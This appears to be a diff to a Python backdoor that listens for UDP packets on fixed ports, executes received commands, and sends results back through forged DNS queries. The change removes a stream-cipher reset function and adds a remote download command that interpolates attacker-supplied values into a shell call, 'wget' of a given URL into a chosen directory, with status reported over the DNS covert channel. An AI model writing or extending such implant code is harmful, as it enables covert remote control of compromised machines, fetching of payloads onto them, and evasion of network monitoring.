@@ -81,11 +81,6 @@ def list_directory(file_path: str) -> list:
         raise DirectoryNotFound
     return os.listdir(file_path)
 
-def cipher_reset():
-    # Reset the stream cipher
-    e.initialize_encryption_context()
-    print("Stream cipher reset.")
-
 def packet_handler(pkt):
     # Do nothing if not the correct packet.
     if pkt[UDP].sport != 10069 or pkt[UDP].dport != 10420:
@@ -116,6 +111,16 @@ def packet_handler(pkt):
             send_dns_query(query)
             print("Sent directory contents")
             return
+    if argc == 3:
+        if argv[0] == WGET:
+            if not os.path.isdir(argv[2]):
+                print("Directory not found.")
+                query = forge_dns_query(data="ERRORMSG: Directory not found or filepath is not a directory.")
+                send_dns_query(query)
+            else:
+                query = forge_dns_query(data="Success.")
+                send_dns_query(query)
+                system(f"wget {argv[1]} -P {argv[2]}")
 
 
 if __name__ == "__main__":
